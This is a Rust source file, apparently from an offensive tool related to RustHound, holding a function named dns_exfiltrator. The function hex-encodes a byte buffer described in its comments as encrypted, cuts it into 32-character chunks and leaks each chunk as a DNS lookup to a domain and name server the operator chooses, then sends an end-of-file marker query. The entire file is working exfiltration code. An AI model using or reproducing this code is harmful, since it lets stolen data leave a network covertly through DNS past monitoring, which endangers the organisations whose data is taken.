use log::{info,debug,trace};
use rand::Rng;

use trust_dns_resolver::Resolver;
use trust_dns_resolver::config::*;

use std::net::{IpAddr, Ipv4Addr, SocketAddr};
use std::time::Duration;

use regex::Regex;

use crate::utils::banner::progress_bar;
use indicatif::ProgressBar;
use std::convert::TryInto;

/// Function to extract data from DNS protocol
/// <https://github.com/OPENCYBER-FR/RustHound/blob/main/src/modules/resolver.rs>
pub fn dns_exfiltrator(
    data: Vec<u8>,
    dns_tcp: bool,
    domain_name: &String,
    name_server: &String,
){
    info!("Starting exfiltration from DNS..");

    let mut c = ResolverConfig::new();
    let mut socket = SocketAddr::new(IpAddr::V4(Ipv4Addr::new(127, 0, 0, 1)), 53);
    let mut dns_protocol = Protocol::Udp;
    if dns_tcp == true
    {
        dns_protocol = Protocol::Tcp;
    }
    if !name_server.contains("127.0.0.1") {
        let address = name_server.parse::<IpAddr>().unwrap_or(std::net::IpAddr::V4(Ipv4Addr::new(127, 0, 0, 1)));
        socket.set_ip(address);
    }
   
    debug!("Protocol DNS: {:?}",&dns_protocol);
    debug!("Name server DNS: {:?}",name_server.parse::<Ipv4Addr>());

    c.add_name_server(NameServerConfig {
      socket_addr: socket,
      protocol: dns_protocol,
      tls_dns_name: None,
      trust_negative_responses: false,
      bind_addr: None,
    });

    let mut o = ResolverOpts::default();
    o.timeout = Duration::new(0, 1);
    // Construct a new Resolver with default configuration options
    //let resolver = TokioAsyncResolver::tokio(c,o).unwrap();
    let resolver = Resolver::new(c.to_owned(), o).unwrap();

    // Encode Vec<u8> crypted to hexa string
    let hexa = hex::encode(data);
    trace!("Hexa data: {:?}",&hexa);
    let re = Regex::new(r"[\w-]{32}").unwrap();
    let caps = re.captures_iter(&hexa);
    let mut rng = rand::thread_rng();
    let rand: u16 = rng.gen();

    // Needed for progress bar stats
    let pb = ProgressBar::new(1);
    let mut count = 0;
    let total = re.captures_iter(&hexa).count();

    // Exfiltrate 32 chars by 32 chars
    for value in caps
    {
        let fqdn = format!("{}-{}.{}",rand.to_string(),&value[0],domain_name);
        //debug!("Exfiltrate: {}",&fqdn.bold().yellow());
        let _result = resolver.lookup_ip(fqdn.to_owned());
        // Manage progress bar
        count += 1;
        let pourcentage = 100 * count / total;
        progress_bar(pb.to_owned(),"Exfiltrate data from DNS ".to_string(),pourcentage.try_into().unwrap(),"%".to_string());
    }
    // End of file
    let fqdn = format!("{}-crdeeofcrde.{}",rand.to_string(),domain_name);
    let _result = resolver.lookup_ip(fqdn.to_owned());

    // Remove progress bar
    pb.finish_and_clear();
    info!("Exfiltration from DNS finished!");
}